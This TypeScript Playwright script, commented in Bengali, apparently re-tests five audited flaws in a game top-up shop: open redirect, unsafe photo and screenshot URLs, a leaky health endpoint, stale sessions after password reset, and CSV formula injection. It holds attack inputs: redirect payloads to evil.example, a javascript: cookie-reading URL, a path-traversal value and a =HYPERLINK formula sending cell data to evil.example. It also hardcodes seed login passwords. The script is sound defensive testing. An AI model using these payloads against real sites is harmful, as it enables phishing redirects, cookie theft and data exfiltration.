/**
 * ═══════════════════════════════════════════════════════════
 * ★★★ নিরাপত্তা-প্রোব (চূড়ান্ত অডিট, ২০২৬-০৯-১৭)
 *
 *   এই রানের সোর্স-অডিটে পাওয়া চারটি ফাঁক — প্রতিটি আসল ব্রাউজার
 *   বা আসল HTTP দিয়ে মাপা হয়, অনুমান দিয়ে নয়:
 *
 *   ১. লগইনের পর open redirect — `callbackUrl=/\evil` বা `/<TAB>/evil`
 *      `startsWith('/') && !startsWith('//')` পার হয়ে যেত, অথচ
 *      ব্রাউজারের URL-পার্সার দুটোকেই `//evil` (অন্য origin) বানায়।
 *   ২. রিভিউর `photoUrl` / ডিপোজিটের `screenshot` — `z.string().url()`
 *      যেকোনো URL নিত (`javascript:` সহ), আর রিভিউর ছবি **পাবলিক**
 *      প্রোডাক্ট-পাতায় `<a href>` হয়ে বসত। উল্টোদিকে আমাদের নিজের
 *      লোকাল-স্টোরেজের `/uploads/…` পথ `url()` প্রত্যাখ্যান করত।
 *   ৩. পাবলিক `/api/health` সাবসিস্টেমের `detail` দিত — DB ডাউন হলে
 *      Prisma-র বার্তায় ডাটাবেস-হোস্টের নাম থাকে।
 *   ৪. পাসওয়ার্ড রিসেটের পর পুরনো সেশন বাতিল হতো না।
 *   ৫. অ্যাডমিন লগ-এক্সপোর্ট CSV-তে গ্রাহকের `User-Agent` সূত্র হয়ে চলত।
 *
 *   চালানো (ডেভ সার্ভার :3000, বা প্রোডাকশন রিগ):
 *     npx tsx scripts/verify/security-probes.ts
 *     VERIFY_BASE=https://localhost:3443 npx tsx scripts/verify/security-probes.ts
 *   ⚠️ তৈরি করা প্রতিটি সারি শেষে মুছে ফেলা হয়।
 * ═══════════════════════════════════════════════════════════
 */
import { db, BASE, dbLabel } from './_db';
import { openBrowser } from './_browser';
import { makeResetToken } from '../../src/lib/passwordReset';
import { request, type Page, type BrowserContext, type APIRequestContext } from 'playwright-core';
import { mkdirSync } from 'node:fs';
import { unlink } from 'node:fs/promises';
import path from 'node:path';

const CUSTOMER = { email: 'customer@uidtopup.local', password: 'Customer@2026Secure' };
const ADMIN = { email: 'admin@uidtopup.local', password: 'Admin@2026Secure' };

/** ★ ব্রাউজার ছাড়া NextAuth credentials লগইন (cookie context-এই থাকে) */
async function apiSignIn(api: APIRequestContext, creds: { email: string; password: string }) {
  await db.rateLimitBucket.deleteMany({});
  const { csrfToken } = await (await api.get('/api/auth/csrf')).json();
  await api.post('/api/auth/callback/credentials', {
    form: { csrfToken, email: creds.email, password: creds.password, json: 'true' },
    maxRedirects: 0, failOnStatusCode: false,
  });
  const s = await (await api.get('/api/auth/session')).json();
  if (!s?.user?.id) throw new Error(`API লগইন ব্যর্থ: ${creds.email}`);
}
const SHOTS = 'audit/shots';
/** ★ প্রোডাকশন রিগের স্ব-স্বাক্ষরিত সার্ট (VERIFY_BASE=https://localhost:3443) */
const TLS = { ignoreHTTPSErrors: true } as const;
mkdirSync(SHOTS, { recursive: true });

let pass = 0;
let fail = 0;
function check(name: string, ok: boolean, note = '') {
  if (ok) pass++; else fail++;
  console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${name}${note ? ` — ${note}` : ''}`);
}

async function clearRateLimits() {
  await db.rateLimitBucket.deleteMany({});
}

async function login(page: Page, callbackUrl: string): Promise<string> {
  await clearRateLimits();
  await page.goto(`${BASE}/login?callbackUrl=${encodeURIComponent(callbackUrl)}`, { waitUntil: 'domcontentloaded' });
  // ★ হাইড্রেশন-গেট — নাহলে fill() React state-এ পৌঁছায় না
  await page.waitForSelector('#v-boot', { state: 'detached', timeout: 30_000 }).catch(() => {});
  await page.fill('input[type="email"]', CUSTOMER.email);
  await page.fill('input[type="password"]', CUSTOMER.password);
  await page.click('button[type="submit"]');
  await page
    .waitForURL((u) => !(u.origin === new URL(BASE).origin && u.pathname.startsWith('/login')), { timeout: 30_000 })
    .catch(() => {});
  await page.waitForTimeout(1500);
  return page.url();
}

async function main() {
  console.log(`═══ নিরাপত্তা-প্রোব · ${BASE} · DB ${dbLabel()} ═══\n`);

  const customer = await db.user.findUnique({ where: { email: CUSTOMER.email }, select: { id: true } });
  if (!customer) throw new Error('ডেভ DB-তে customer@uidtopup.local নেই — npm run dev:db:seed');
  const variant = await db.variant.findFirst({ where: { isActive: true }, include: { product: true } });
  if (!variant) throw new Error('কোনো সক্রিয় ভ্যারিয়েন্ট নেই');

  const browser = await openBrowser({ headless: process.env.HEADLESS === '1' });
  const created: { orderId?: string; userId?: string; uploadUrl?: string; depositIds: string[] } = { depositIds: [] };

  try {
    /* ── ১. open redirect ── */
    console.log('১. লগইনের পর callbackUrl — কেবল নিজের origin');
    const payloads = ['/\\evil.example/x', '/\t/evil.example/x', '//evil.example/x', 'https://evil.example/x', '/%5Cevil.example'];
    let ctx: BrowserContext | null = null;
    for (const p of payloads) {
      ctx = await browser.newContext({ ...TLS, viewport: { width: 390, height: 844 } });
      // ★ বাইরের হোস্টে সত্যিকারের অনুরোধ যেন না যায় — ধরে ফেলে থামাই
      // ⚠️ hostname দিয়ে মেলাতে হয় — regex দিলে লগইন-পাতার নিজের URL
      //   (query-তে `evil.example` আছে) ধরা পড়ে ও পাতাটাই "EVIL" হয়ে যায়
      await ctx.route((u) => u.hostname.endsWith('evil.example'), (r) => r.fulfill({ status: 200, body: 'EVIL' }));
      const page = await ctx.newPage();
      const finalUrl = await login(page, p);
      const host = new URL(finalUrl).host;
      check(`callbackUrl=${JSON.stringify(p)}`, host === new URL(BASE).host, `শেষ URL ${finalUrl}`);
      if (host !== new URL(BASE).host) await page.screenshot({ path: `${SHOTS}/final-open-redirect.png` }).catch(() => {});
      await ctx.close();
      ctx = null;
    }
    // বৈধ ভেতরের পথ এখনো কাজ করে
    ctx = await browser.newContext({ ...TLS, viewport: { width: 390, height: 844 } });
    const page = await ctx.newPage();
    const okUrl = await login(page, '/account/orders?tab=all');
    check('বৈধ callbackUrl /account/orders?tab=all মান্য হয়', new URL(okUrl).pathname === '/account/orders', okUrl);

    /* ── ২. রিভিউর ছবি ও ডিপোজিট স্ক্রিনশট ── */
    console.log('\n২. ছবি-URL — কেবল আমাদের নিজের স্টোরেজ');
    const order = await db.order.create({
      data: {
        userId: customer.id, variantId: variant.id, playerUid: '123456789',
        subtotal: variant.price, price: variant.price, productName: variant.product.name,
        variantName: variant.label, status: 'COMPLETED', completedAt: new Date(),
        deliveryConfirmedAt: new Date(),
      },
    });
    created.orderId = order.id;

    for (const bad of ['javascript:alert(document.cookie)', 'https://evil.example/x.png', 'http://localhost:3000/uploads/deposits/1-a.png', '/uploads/../api/admin/backup']) {
      const r = await ctx.request.post(`${BASE}/api/review`, {
        data: { orderId: order.id, rating: 5, photoUrl: bad }, failOnStatusCode: false,
      });
      check(`রিভিউ photoUrl ${JSON.stringify(bad)} প্রত্যাখ্যাত`, r.status() === 400, `→ ${r.status()}`);
    }

    // আসল আপলোড — ১×১ PNG
    const png = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
      'base64',
    );
    const up = await ctx.request.post(`${BASE}/api/upload`, {
      multipart: { file: { name: 'probe.png', mimeType: 'image/png', buffer: png } },
      failOnStatusCode: false,
    });
    const upJson = up.ok() ? await up.json() : null;
    check('/api/upload আসল PNG গ্রহণ করে', up.ok() && typeof upJson?.url === 'string', `→ ${up.status()} ${upJson?.url ?? ''}`);
    const realUrl: string = upJson?.url ?? '';
    created.uploadUrl = realUrl;

    const trx = `PROBE${Date.now()}`.slice(0, 20).toUpperCase();
    const dep = await ctx.request.post(`${BASE}/api/deposit`, {
      data: { method: 'BKASH', amount: 100, trxId: trx, senderNo: '01712345678', screenshot: realUrl },
      failOnStatusCode: false,
    });
    const depBody = await dep.text();
    check('ডিপোজিট: নিজের আপলোড করা স্ক্রিনশট গ্রহণ করে', dep.status() === 200, `→ ${dep.status()} ${depBody.slice(0, 120)}`);

    const depBad = await ctx.request.post(`${BASE}/api/deposit`, {
      data: { method: 'BKASH', amount: 100, trxId: `${trx}X`, senderNo: '01712345678', screenshot: 'https://evil.example/p.png' },
      failOnStatusCode: false,
    });
    check('ডিপোজিট: বাইরের স্ক্রিনশট-URL প্রত্যাখ্যাত', depBad.status() === 400, `→ ${depBad.status()}`);
    const deps = await db.deposit.findMany({ where: { trxId: { in: [trx, `${trx}X`] } }, select: { id: true } });
    created.depositIds = deps.map((d) => d.id);

    const rev = await ctx.request.post(`${BASE}/api/review`, {
      data: { orderId: order.id, rating: 5, body: 'প্রোব', photoUrl: realUrl }, failOnStatusCode: false,
    });
    check('রিভিউ: নিজের আপলোড করা ছবি গ্রহণ করে', rev.status() === 200, `→ ${rev.status()}`);

    /* ── ৩. পাবলিক হেলথ ── */
    console.log('\n৩. পাবলিক /api/health — অভ্যন্তরীণ বিবরণ নয়');
    const anon = await browser.newContext(TLS);
    const h = await anon.request.get(`${BASE}/api/health`, { failOnStatusCode: false });
    const hj = await h.json();
    const leaks = (hj.subsystems ?? []).filter((s: { detail?: string }) => s.detail);
    check('subsystems-এ কোনো detail নেই', leaks.length === 0, `detail আছে: ${leaks.map((s: { key: string }) => s.key).join(',') || '০'}`);
    check('status / db / subsystems[].state তবু আছে', typeof hj.status === 'string' && typeof hj.db === 'string'
      && (hj.subsystems ?? []).every((s: { state?: string }) => typeof s.state === 'string'));
    await anon.close();

    /* ── ৪. রিসেটে সেশন বাতিল ── */
    console.log('\n৪. পাসওয়ার্ড রিসেট — পুরনো সেশন-যুগ বাতিল');
    const temp = await db.user.create({
      data: {
        name: 'রিসেট প্রোব', email: `reset-probe-${Date.now()}@verify.local`,
        phone: `018${String(Date.now()).slice(-8)}`, password: '$2a$12$abcdefghijklmnopqrstuuJ4oVn0bI1Qf2iO3dM8yP5xZ6rT7wK9e',
        referralCode: `RP${Date.now().toString(36).toUpperCase()}`.slice(0, 12),
      },
      select: { id: true, password: true, sessionEpoch: true },
    });
    created.userId = temp.id;
    const token = makeResetToken(temp.id, temp.password);
    await clearRateLimits();
    const resetCtx = await browser.newContext(TLS);
    const rr = await resetCtx.request.post(`${BASE}/api/auth/reset`, {
      data: { token, password: 'NewProbe2026x' }, failOnStatusCode: false,
    });
    check('রিসেট সফল', rr.status() === 200, `→ ${rr.status()}`);
    const after = await db.user.findUnique({ where: { id: temp.id }, select: { sessionEpoch: true } });
    check('sessionEpoch বেড়েছে (অন্য সব ডিভাইসের টোকেন বাসি)', (after?.sessionEpoch ?? 0) > temp.sessionEpoch,
      `${temp.sessionEpoch} → ${after?.sessionEpoch}`);
    const again = await resetCtx.request.post(`${BASE}/api/auth/reset`, {
      data: { token, password: 'NewProbe2026y' }, failOnStatusCode: false,
    });
    check('একই রিসেট-লিংক দ্বিতীয়বার চলে না', again.status() === 400, `→ ${again.status()}`);
    await resetCtx.close();

    await ctx.close();

    /* ── ৫. লগ-এক্সপোর্টে formula injection ── */
    console.log('\n৫. অ্যাডমিন লগ-এক্সপোর্ট (CSV) — গ্রাহকের দেওয়া মান সূত্র হয়ে চলে না');
    const EVIL_UA = '=HYPERLINK("https://evil.example/?"&A1,"open")';
    const evil = await request.newContext({ ...TLS, baseURL: BASE, extraHTTPHeaders: { 'user-agent': EVIL_UA } });
    await apiSignIn(evil, CUSTOMER);
    const csvTrx = `CSVPROBE${Date.now()}`.slice(0, 24);
    const d2 = await evil.post('/api/deposit', {
      data: { method: 'NAGAD', amount: 100, trxId: csvTrx, senderNo: '01712345678' }, failOnStatusCode: false,
    });
    check('ডিপোজিট তৈরি (UA-তে সূত্র)', d2.ok(), `→ ${d2.status()}`);
    const dep2 = await db.deposit.findUnique({ where: { trxId: csvTrx }, select: { id: true } });
    if (dep2) created.depositIds.push(dep2.id);
    await evil.dispose();

    const adminApi = await request.newContext({ ...TLS, baseURL: BASE });
    await apiSignIn(adminApi, ADMIN);
    // ★ লগ best-effort (await নয়) — সারিটি বসা পর্যন্ত একটু অপেক্ষা
    for (let i = 0; i < 10 && !(await db.adminLog.count({ where: { detail: { contains: csvTrx } } })); i++) {
      await new Promise((r) => setTimeout(r, 300));
    }
    const exp = await adminApi.get(`/api/admin/logs/export?q=${csvTrx}`, { failOnStatusCode: false });
    const csv = await exp.text();
    check('এক্সপোর্টে সারিটি আছে', exp.ok() && csv.includes(csvTrx), `→ ${exp.status()}`);
    check('UA সেলটি `\'` দিয়ে নিষ্ক্রিয়', csv.includes(`"'=HYPERLINK`) && !csv.includes(`"=HYPERLINK`));
    await adminApi.dispose();
  } finally {
    // ── পরিষ্কার ──
    if (created.orderId) {
      await db.review.deleteMany({ where: { orderId: created.orderId } }).catch(() => {});
      await db.order.delete({ where: { id: created.orderId } }).catch(() => {});
    }
    if (created.depositIds.length) {
      await db.adminLog.deleteMany({ where: { targetId: { in: created.depositIds } } }).catch(() => {});
      await db.deposit.deleteMany({ where: { id: { in: created.depositIds } } }).catch(() => {});
    }
    if (created.userId) {
      await db.notification.deleteMany({ where: { userId: created.userId } }).catch(() => {});
      await db.user.delete({ where: { id: created.userId } }).catch(() => {});
    }
    // ★ লোকাল ড্রাইভারে আপলোড করা প্রোব-ছবিটিও মুছি
    if (created.uploadUrl?.startsWith('/uploads/')) {
      await unlink(path.join(process.cwd(), 'public', created.uploadUrl)).catch(() => {});
    }
    await clearRateLimits();
    await browser.close().catch(() => {});
    await db.$disconnect();
  }

  console.log(`\n═══ ফল: ${pass} PASS · ${fail} FAIL ═══`);
  process.exitCode = fail ? 1 : 0;
}

main().catch((e) => {
  console.error(e);
  process.exitCode = 1;
});
